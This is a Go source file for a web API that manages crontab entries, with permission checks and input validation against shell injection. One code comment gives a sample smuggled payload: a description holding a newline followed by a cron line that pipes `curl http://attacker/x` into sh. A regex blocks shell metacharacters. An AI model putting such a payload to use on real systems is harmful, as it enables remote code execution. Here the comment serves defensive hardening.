package v1

import (
	"crypto/sha256"
	"fmt"
	"net/http"
	"os/exec"
	"regexp"
	"strings"

	"github.com/LeewayOpenSoftware/CasaNova-Common/model"
	"github.com/LeewayOpenSoftware/CasaNova-Common/pkg/rbac"
	"github.com/LeewayOpenSoftware/CasaNova-Common/utils/common_err"
	"github.com/labstack/echo/v4"
	"github.com/robfig/cron/v3"
)

// ---- Cron job types ----

type CronJob struct {
	ID          string `json:"id"`
	Schedule    string `json:"schedule"`
	Command     string `json:"command"`
	Description string `json:"description"`
	Enabled     bool   `json:"enabled"`
}

// ---- Helpers ----

// cronID generates a deterministic ID from schedule + command.
func cronID(schedule, command string) string {
	h := sha256.Sum256([]byte(schedule + "\x00" + command))
	return fmt.Sprintf("%x", h[:8])
}

// dangerousPattern rejects shell meta-characters that could allow injection.
// Blocks: ; | ` \n \r && $( ${ > < and & followed by whitespace (background).
var dangerousPattern = regexp.MustCompile("[;|`\n\r]|&&|\\$[({]|[><]|&\\s")

// cronFieldPattern validates that a cron expression has exactly 5 fields,
// each consisting of digits, asterisks, slashes, commas, and hyphens.
var cronFieldPattern = regexp.MustCompile(`^[0-9*,/\-]+$`)

// scheduleParser only enforces the 5-field standard form. The regex
// above is a coarse syntax check (it can pass nonsense like
// "0-999/1 * 31 2 *" — Feb 31, infinite range) so we hand the result
// to robfig/cron's parser to verify the schedule actually evaluates.
// Without this, sysadmins can save jobs that "validated" but never
// fire — a silent-failure mode that's hard to debug.
var scheduleParser = cron.NewParser(cron.Minute | cron.Hour | cron.Dom | cron.Month | cron.Dow)

func validateSchedule(schedule string) string {
	fields := strings.Fields(schedule)
	if len(fields) != 5 {
		return "schedule must have exactly 5 fields (minute hour dom month dow)"
	}
	for _, f := range fields {
		if !cronFieldPattern.MatchString(f) {
			return fmt.Sprintf("invalid cron field: %q", f)
		}
	}
	if _, err := scheduleParser.Parse(schedule); err != nil {
		return "schedule is syntactically valid but cannot be parsed by cron: " + err.Error()
	}
	return ""
}

func validateCommand(command string) string {
	if strings.TrimSpace(command) == "" {
		return "command is required"
	}
	if dangerousPattern.MatchString(command) {
		return "command contains disallowed characters (;, |, &&, backticks, $(...), ${...}, >, <, &, or newlines)"
	}
	return ""
}

// validateDescription rejects descriptions that would break crontab
// rendering. Wave 33: previously only Command was validated, but
// PostCronJob and rebuildCrontab concatenate the description directly
// into the crontab text as `# description: ...` followed by the
// schedule line. A description containing a newline injects a *real*
// crontab entry that bypasses validateCommand entirely — a
// PermSystemConfig user could submit `daily backup\n* * * * * curl
// http://attacker/x|sh` and the second line lands in the crontab as
// a live job firing every minute. The dashboard only ever displays
// the description text so admin review of "official" commands does
// not surface the smuggled line. Strip CR/LF (and cap length so the
// rendered crontab stays sane).
func validateDescription(description string) string {
	if strings.ContainsAny(description, "\r\n") {
		return "description must not contain newline characters"
	}
	if len(description) > 256 {
		return "description must be 256 characters or fewer"
	}
	return ""
}

// readCrontab returns the current crontab lines. An empty crontab is
// not an error — crontab -l exits non-zero when empty on some systems.
func readCrontab() ([]string, error) {
	out, err := exec.Command("crontab", "-l").CombinedOutput()
	if err != nil {
		// "no crontab for ..." is normal on a fresh system.
		if strings.Contains(string(out), "no crontab") {
			return []string{}, nil
		}
		return nil, fmt.Errorf("crontab -l failed: %s", strings.TrimSpace(string(out)))
	}
	lines := strings.Split(strings.TrimRight(string(out), "\n"), "\n")
	// Filter empty trailing line from the split.
	if len(lines) == 1 && lines[0] == "" {
		return []string{}, nil
	}
	return lines, nil
}

// writeCrontab replaces the current crontab with the given lines.
func writeCrontab(lines []string) error {
	content := strings.Join(lines, "\n") + "\n"
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(content)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("crontab - failed: %s", strings.TrimSpace(string(out)))
	}
	return nil
}

// parseCronLines converts raw crontab lines into CronJob structs.
// A line like `# description: Daily backup` immediately before a cron
// line sets the description for that job. Commented-out cron lines
// (starting with `#` followed by a valid schedule) are parsed as
// disabled jobs.
func parseCronLines(lines []string) []CronJob {
	var jobs []CronJob
	var pendingDesc string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			pendingDesc = ""
			continue
		}

		// Metadata comment: # description: ...
		if strings.HasPrefix(trimmed, "# description:") {
			pendingDesc = strings.TrimSpace(strings.TrimPrefix(trimmed, "# description:"))
			continue
		}

		// Pure comment (not a disabled cron line).
		if strings.HasPrefix(trimmed, "#") {
			// Check if it's a commented-out cron line (disabled job).
			inner := strings.TrimSpace(strings.TrimPrefix(trimmed, "#"))
			fields := strings.Fields(inner)
			if len(fields) >= 6 && validateSchedule(strings.Join(fields[:5], " ")) == "" {
				schedule := strings.Join(fields[:5], " ")
				command := strings.Join(fields[5:], " ")
				jobs = append(jobs, CronJob{
					ID:          cronID(schedule, command),
					Schedule:    schedule,
					Command:     command,
					Description: pendingDesc,
					Enabled:     false,
				})
				pendingDesc = ""
				continue
			}
			// Some other comment — skip.
			pendingDesc = ""
			continue
		}

		// Active cron line.
		fields := strings.Fields(trimmed)
		if len(fields) >= 6 {
			schedule := strings.Join(fields[:5], " ")
			command := strings.Join(fields[5:], " ")
			if validateSchedule(schedule) == "" {
				jobs = append(jobs, CronJob{
					ID:          cronID(schedule, command),
					Schedule:    schedule,
					Command:     command,
					Description: pendingDesc,
					Enabled:     true,
				})
			}
		}
		pendingDesc = ""
	}
	return jobs
}

// rebuildCrontab turns a slice of CronJob structs back into crontab
// lines, preserving description metadata comments.
//
// Wave 33: defense-in-depth — strip CR/LF from descriptions even
// though validateDescription should have rejected them on input.
// rebuildCrontab is also reached from PostCronToggle and from
// parseCronLines round-trips, so a description that was somehow
// persisted on disk via an older binary cannot smuggle a newline
// into a fresh write.
func rebuildCrontab(jobs []CronJob) []string {
	var lines []string
	for _, job := range jobs {
		if job.Description != "" {
			desc := strings.NewReplacer("\r", " ", "\n", " ").Replace(job.Description)
			lines = append(lines, "# description: "+desc)
		}
		entry := job.Schedule + " " + job.Command
		if !job.Enabled {
			entry = "# " + entry
		}
		lines = append(lines, entry)
	}
	return lines
}

// ---- Handlers ----

// GET /v1/sys/cron — List all cron jobs.
func GetCronJobs(ctx echo.Context) error {
	if err := requirePerm(ctx, rbac.PermSystemRead); err != nil {
		return err
	}
	lines, err := readCrontab()
	if err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	jobs := parseCronLines(lines)
	if jobs == nil {
		jobs = []CronJob{}
	}

	return ctx.JSON(http.StatusOK, model.Result{
		Success: common_err.SUCCESS,
		Message: common_err.GetMsg(common_err.SUCCESS),
		Data:    jobs,
	})
}

// POST /v1/sys/cron — Add a new cron job.
func PostCronJob(ctx echo.Context) error {
	if err := requirePerm(ctx, rbac.PermSystemConfig); err != nil {
		return err
	}
	var job CronJob
	if err := ctx.Bind(&job); err != nil {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: "invalid request body",
		})
	}

	if msg := validateSchedule(job.Schedule); msg != "" {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: msg,
		})
	}
	if msg := validateCommand(job.Command); msg != "" {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: msg,
		})
	}
	if msg := validateDescription(job.Description); msg != "" {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: msg,
		})
	}

	job.ID = cronID(job.Schedule, job.Command)
	job.Enabled = true

	lines, err := readCrontab()
	if err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	// Enforce a maximum number of cron jobs to prevent resource exhaustion.
	if existing := parseCronLines(lines); len(existing) >= 100 {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: "maximum number of cron jobs (100) reached",
		})
	}

	// Append new entry.
	if job.Description != "" {
		lines = append(lines, "# description: "+job.Description)
	}
	lines = append(lines, job.Schedule+" "+job.Command)

	if err := writeCrontab(lines); err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	return ctx.JSON(http.StatusOK, model.Result{
		Success: common_err.SUCCESS,
		Message: common_err.GetMsg(common_err.SUCCESS),
		Data:    job,
	})
}

// PUT /v1/sys/cron/:id — Update an existing cron job.
func PutCronJob(ctx echo.Context) error {
	if err := requirePerm(ctx, rbac.PermSystemConfig); err != nil {
		return err
	}
	id := ctx.Param("id")

	var update CronJob
	if err := ctx.Bind(&update); err != nil {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: "invalid request body",
		})
	}

	if msg := validateSchedule(update.Schedule); msg != "" {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: msg,
		})
	}
	if msg := validateCommand(update.Command); msg != "" {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: msg,
		})
	}
	if msg := validateDescription(update.Description); msg != "" {
		return ctx.JSON(http.StatusBadRequest, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: msg,
		})
	}

	lines, err := readCrontab()
	if err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	jobs := parseCronLines(lines)
	found := false
	for i, j := range jobs {
		if j.ID == id {
			update.ID = cronID(update.Schedule, update.Command)
			update.Enabled = j.Enabled // preserve enabled state
			jobs[i] = update
			found = true
			break
		}
	}

	if !found {
		return ctx.JSON(http.StatusNotFound, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: "cron job not found",
		})
	}

	if err := writeCrontab(rebuildCrontab(jobs)); err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	return ctx.JSON(http.StatusOK, model.Result{
		Success: common_err.SUCCESS,
		Message: common_err.GetMsg(common_err.SUCCESS),
		Data:    update,
	})
}

// DELETE /v1/sys/cron/:id — Remove a cron job.
func DeleteCronJob(ctx echo.Context) error {
	if err := requirePerm(ctx, rbac.PermSystemConfig); err != nil {
		return err
	}
	id := ctx.Param("id")

	lines, err := readCrontab()
	if err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	jobs := parseCronLines(lines)
	found := false
	var remaining []CronJob
	for _, j := range jobs {
		if j.ID == id {
			found = true
			continue
		}
		remaining = append(remaining, j)
	}

	if !found {
		return ctx.JSON(http.StatusNotFound, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: "cron job not found",
		})
	}

	if err := writeCrontab(rebuildCrontab(remaining)); err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	return ctx.JSON(http.StatusOK, model.Result{
		Success: common_err.SUCCESS,
		Message: common_err.GetMsg(common_err.SUCCESS),
	})
}

// POST /v1/sys/cron/:id/toggle — Enable or disable a cron job.
func PostCronToggle(ctx echo.Context) error {
	if err := requirePerm(ctx, rbac.PermSystemConfig); err != nil {
		return err
	}
	id := ctx.Param("id")

	lines, err := readCrontab()
	if err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	jobs := parseCronLines(lines)
	found := false
	var toggled CronJob
	for i, j := range jobs {
		if j.ID == id {
			jobs[i].Enabled = !j.Enabled
			toggled = jobs[i]
			found = true
			break
		}
	}

	if !found {
		return ctx.JSON(http.StatusNotFound, model.Result{
			Success: common_err.CLIENT_ERROR,
			Message: "cron job not found",
		})
	}

	if err := writeCrontab(rebuildCrontab(jobs)); err != nil {
		return ctx.JSON(http.StatusInternalServerError, model.Result{
			Success: common_err.SERVICE_ERROR,
			Message: err.Error(),
		})
	}

	return ctx.JSON(http.StatusOK, model.Result{
		Success: common_err.SUCCESS,
		Message: common_err.GetMsg(common_err.SUCCESS),
		Data:    toggled,
	})
}
